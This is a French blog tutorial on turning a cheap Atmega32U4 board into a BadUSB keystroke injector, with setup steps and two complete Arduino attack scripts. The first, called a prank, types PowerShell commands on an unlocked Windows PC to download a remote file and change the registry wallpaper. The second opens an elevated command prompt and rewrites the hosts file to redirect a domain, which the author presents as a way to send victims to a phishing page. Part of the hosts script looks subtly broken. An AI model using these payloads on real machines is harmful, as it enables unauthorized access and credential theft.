---
layout: post
title:  "Tuto - BadUSB Atmega32U4"
date:   2020-01-12 02:07:42 +0100
categories: hacking
author: Vixepti
image: /assets/2020/01/bad-usb-32u4-thumbnail.jpg
tags: [badusb, beetle bad, lilygo, atmega32u4, leonardo, arduino, HID, USB Rubber Ducky]
---
Dans cet article, on va utiliser une BadUSB basé sur un Atmega32U4 (Arduino leonardo) à 3,5€. <!--more--> On la trouve sous le nom de BadUSB Beetle Bad, BadUSB Lily GO, BadUSB Atmega32U4, peut importe... Elle est similaire à l'USB Rubber Ducky. Elle agit en tant que périphérique HID, en réalisant des entrées clavier / souris automatiquement et très rapidement.


## Une BadUSB, c'est quoi ?

C'est un petit dispositif USB permettant se faisant passer pour un périphérique [USB-HID](https://en.wikipedia.org/wiki/USB_human_interface_device_class) (clavier, souris), et qui va réaliser des entrées clavier / souris automatiquement et surtout très rapidement.

## Configuration de l'environnement

Tout d'abord nous allons utiliser le logiciel **Arduino**. S'il n'est pas installé, vous pouvez le trouver sur le [site officiel](https://www.arduino.cc/en/main/software). Sur windows, comme d'habitude, il suffit de lancer l'exécutable et faire suivant plein de fois. Pour linux, tout dépends de la distribution. J'utilise personnellement Manjaro, il est dans les dépôts mais c'est pas la dernière vesion alors je l'installe depuis le [repo github](https://www.arduino.cc/en/Guide/Linux) grâce à *yay*.

Normalement, il n'y a rien à faire dans le *Gestionnaire de cartes*, car c'est un arduino leonardo, qui est géré par défaut dans le logiciel.

Il faut également installer les librairies **Keyboard** et **Mouse**. Pour ça on va dans *Outils* -> *Gestionnaire de bibliotèque* et on chercher *keyboard*. Puis on installe les deux librairies :

{:refdef: style="text-align: center;}
[![Librairies arduino Keyboard et Mouse](/assets/2020/01/badusb_keyboard-mouse-libs.png)](/assets/2020/01/badusb_keyboard-mouse-libs.png)
{: refdef}

***Pour les claviers AZERTY :***

La librairie **Keyboard** a été faite pour les claviers QWERTY. Donc si on tape par exemple un *A*, on aura un *Q*.

Pour contourner le problème, la librairie a été adaptée en AZERTY dans [KeyboardAzertyFR disponible sur github](https://github.com/martin-leo/KeyboardAzertyFr).

Quelques caractères foireux persistent (par exemple : `\` ). Pour résoudre ce problème, il y a un [tuto intéressant](https://forum.arduino.cc/index.php?topic=552465.0) sur le forum arduino. En fait il s’agit d’ajouter la fonction suivante :

{% highlight cpp %}
void keyboardScanCode(byte code){
    Keyboard.press(code+136);
    delay(5);
    Keyboard.release(code+136);
}
{% endhighlight %}

## Ecrire des programmes

Pour tous les programmes, la première chose à faire est d'inclure la librairie que l'on va utiliser (*Keyboard.h* ou *Mouse.h*) :

{% highlight cpp %}
#include <Keyboard.h>
#include <KeyboardAzertyFr.h> // pour les claviers AZERTY (voir plus haut dans l'article)
#include <Mouse.h>
{% endhighlight %}

La pluspart du temps, on va écrire le programme dans la fonction *setup()*. En effet, on ne veut généralement pas que le programme soit exécuté en boucle, on laisse donc *loop()* vide.

Pour indiquer à l'arduino (la clé usb) qu'il doit commencer à émuler un clavier, on utilisera :

{% highlight cpp %}
Keyboard.begin();
// OU, pour un clavier AZERTY :
KeyboardAzertyFr.begin();
{% endhighlight %}

Et pour arrêter l'émulation :

{% highlight cpp %}
Keyboard.end();
// OU, pour un clavier AZERTY :
KeyboardAzertyFr.end();
{% endhighlight %}

### Fonctions utiles

> Pour des questions de simplicité, à partir d'ici, je ne vais noter que les notations utilisant la librairie *KeyboardAzertyFr*. Mais libre à chacun d'utiliser *Keyboard*.

* *press()* : Effectue un enfoncement de touche sans relâchement. Il faut utiliser *release()* ou *releaseAll()* pour relâcher la touche.

{% highlight cpp %}

{% endhighlight %}

* *print()* : Effectue une frappe clavier (enfoncement et relâchement "normal").

{% highlight cpp %}

{% endhighlight %}

* *println()* : Effectue une frappe clavier puis un retour chariot.

{% highlight cpp %}

{% endhighlight %}

* *release()* : Relâche la touche passée en argument.

{% highlight cpp %}

{% endhighlight %}

* *releaseAll()* : Relâche toutes les touches actuellement enfoncées (avec *press()*).

{% highlight cpp %}

{% endhighlight %}

* *write()* : Effectue une frappe clavier ou un enchaînement de frappes. Permet d'envoyer un ou plusieurs caractères. Supporte les caractères normaux et les codes ASCII, en décimal, hexadécimal et binaire.

{% highlight cpp %}
Keyboard.write(86);         // Valeur ASCII pour V
Keyboard.write('V');        // V en char
Keyboard.write(0x56);       // Valeur hexadecimal pour V
Keyboard.write(0b01010110); // Valeur binaire pour V
{% endhighlight %}

* ***delay()*** : Une des fonctions les plus utiles. Elle permet de faire attendre le programme un certain temps avant de continuer. Ici, on s'en sert pour réguler la vitesse de frappe clavier. Lorsqu'on lance un programme, celui-ci ne s'ouvre et s'affiche pas instantannément (surtout si le PC est lent). On attends donc 2000 ms par exemple, puis on continue. On évite ainsi de taper dans le vide.


## Exemples d'application

> Je posterai tous les programmes que j'écris sur mon github : [https://github.com/Vixepti/BadUSB-Scripts](https://github.com/Vixepti/BadUSB-Scripts)
> Pour l'instant il n'y a pas grand chose, mais j'ajouterai au fur et à mesure...
> Si vous avez des suggestions, je suis aussi preneur !

### Pranks
On peut ce servir de ce type de périphérique pour faire des blagues aux copains. Par exemple, quelqu'un laisse son PC déverrouillé en partant (même 30 secondes). J'en profite pour brancher la clé, et avec le bon programme, il se retrouve avec un fond d'écran teletubbies :

<div class="youtube-embed">
    <iframe width="560" height="315" src="https://www.youtube.com/embed/" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
</div>

Le programme pour windows que j'ai utilisé est le suivant :

{% highlight cpp %}
#include <KeyboardAzertyFr.h>

void keyboardScanCode(byte code){
    KeyboardAzertyFr.press(code+136);
    delay(5);
    KeyboardAzertyFr.release(code+136);
}

// Used to print backslashs
void backslash() {
  KeyboardAzertyFr.press(KEY_LEFT_CTRL);
  KeyboardAzertyFr.press(KEY_LEFT_ALT);
  keyboardScanCode(37);
  KeyboardAzertyFr.release(KEY_LEFT_ALT);
  KeyboardAzertyFr.release(KEY_LEFT_CTRL);  
}

void setup() {
    KeyboardAzertyFr.begin();
    delay(2000);

// Open Windows start menu, pressing "Left Windows Key"
    KeyboardAzertyFr.press(KEY_LEFT_GUI);
    KeyboardAzertyFr.releaseAll();
    delay(500);

// Open powershell
    KeyboardAzertyFr.print("powershell");
    delay(200);
    KeyboardAzertyFr.press(KEY_RETURN);
    KeyboardAzertyFr.releaseAll();
    delay(500);

// Prepare Download
    KeyboardAzertyFr.print("$client=new-object System.Net.WebClient");
    KeyboardAzertyFr.press(KEY_RETURN);
    KeyboardAzertyFr.releaseAll();
    delay(500);

// Download image file (CHANGE URL IF YOU DON'T LIKE TELETUBBIES, CHANGE FILENAME "wallpaper.jpg" IF YOU NEED TO)
    KeyboardAzertyFr.print("$client.DownloadFile(\"http://getwallpapers.com/wallpaper/full/0/e/2/1209647-teletubbies-wallpaper-hd-1920x1080-for-computer.jpg\" , \"wallpaper.jpg\")");
    KeyboardAzertyFr.press(KEY_RETURN);
    KeyboardAzertyFr.releaseAll();
    delay(1500);

// Change Wallpaper
    KeyboardAzertyFr.print("set-itemproperty HKCU:"); // Start modifying windows register
    backslash();
    KeyboardAzertyFr.print("\"Control Panel");
    backslash();
    KeyboardAzertyFr.print("Desktop\" WallPaper \"%USERPROFILE%/wallpaper.jpg\""); // End modifying register. CHANGE FILENAME "wallpaper.jpg" IF YOU NEED TO
    KeyboardAzertyFr.press(KEY_RETURN);
    KeyboardAzertyFr.releaseAll();
    delay(2000);

// Refresh user settings to apply new wallpaper.
    KeyboardAzertyFr.print("RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters, 1, True");
    KeyboardAzertyFr.press(KEY_RETURN);
    KeyboardAzertyFr.releaseAll();
    delay(500);

// Exit powershell
    KeyboardAzertyFr.print("exit");
    KeyboardAzertyFr.press(KEY_RETURN);
    KeyboardAzertyFr.releaseAll();
}
void loop() {}
{% endhighlight %}

Son fonctionnement est un peu aléatoire pour l'instant. Je ne suis pas certain que l'utilisation de *UpdatePerUserSystemParameters* soit la meilleur solution, mais je n'ai pas eu le temps de trouver mieux. Parfois le fond d'écran est changé tout de suite, d'autres fois, il l'est à la prochaine ouverture de session (ça fait aussi son petit effet).

### Hacks

Les farces, c'est marrant mais ça sert à rien. En revanche, niveau sécurité, ces petits outils sont de vrais bijoux. Les ports USB étant rarement désactivés, avec un accès à la machine, les possibilités sont quasi-infinis.

On peut par exemple modifier le fichier *hosts* d'un PC pour rediriger toutes les requêtes envoyé à une adresse vers une autre. Cette dernière pourrait éventuellement être une page de phishing qui volerait des identifiants :

{% highlight cpp %}
#include <KeyboardAzertyFr.h>

void keyboardScanCode(byte code){
    KeyboardAzertyFr.press(code+136);
    delay(5);
    KeyboardAzertyFr.release(code+136);
}

void backslash() {
    KeyboardAzertyFr.press(KEY_LEFT_CTRL);
    KeyboardAzertyFr.press(KEY_LEFT_ALT);
    keyboardScanCode(37);
    KeyboardAzertyFr.release(KEY_LEFT_ALT);
    KeyboardAzertyFr.release(KEY_LEFT_CTRL);  
}

void setup() {
    KeyboardAzertyFr.begin();
    delay(1000);
  
//open comand prompt
    KeyboardAzertyFr.press(KEY_LEFT_GUI);
    KeyboardAzertyFr.press('r');
    KeyboardAzertyFr.releaseAll();
    delay(300);
    
    KeyboardAzertyFr.print("cmd");
    KeyboardAzertyFr.press(KEY_LEFT_CTRL);
    KeyboardAzertyFr.press(KEY_LEFT_SHIFT);
    KeyboardAzertyFr.press(KEY_RETURN);
    KeyboardAzertyFr.releaseAll();
    delay(1000);

    KeyboardAzertyFr.press(KEY_LEFT_ALT);
    KeyboardAzertyFr.press('o');
    KeyboardAzertyFr.releaseAll();
  
    KeyboardAzertyFr.press(KEY_RETURN);
    KeyboardAzertyFr.releaseAll();
    delay(1000);
  
//insert 192.168.0.42
    KeyboardAzertyFr.print("ECHO. >> C:");
    backslash();
    KeyboardAzertyFr.print("WINDOWS");
    backslash();
    KeyboardAzertyFr.print("SYSTEM32");
    backslash();
    KeyboardAzertyFr.print("DRIVERS");
    backslash();
    KeyboardAzertyFr.print("ETC");
    backslash();
    KeyboardAzertyFr.print("HOSTS");
    KeyboardAzertyFr.press(KEY_RETURN);
    KeyboardAzertyFr.releaseAll();

    delay(500);

    KeyboardAzertyFr.print("ECHO 192.168.0.42 example.lolcat >> C:");
    KeyboardAzertyFr.print("ECHO. >> C:");
    backslash();
    KeyboardAzertyFr.print("WINDOWS");
    backslash();
    KeyboardAzertyFr.print("SYSTEM32");
    backslash();
    KeyboardAzertyFr.print("DRIVERS");
    backslash();
    KeyboardAzertyFr.print("ETC");
    backslash();
    KeyboardAzertyFr.print("HOSTS");
    KeyboardAzertyFr.press(KEY_RETURN);
    KeyboardAzertyFr.releaseAll();
    delay(500);
}

void loop() {}
{% endhighlight %}

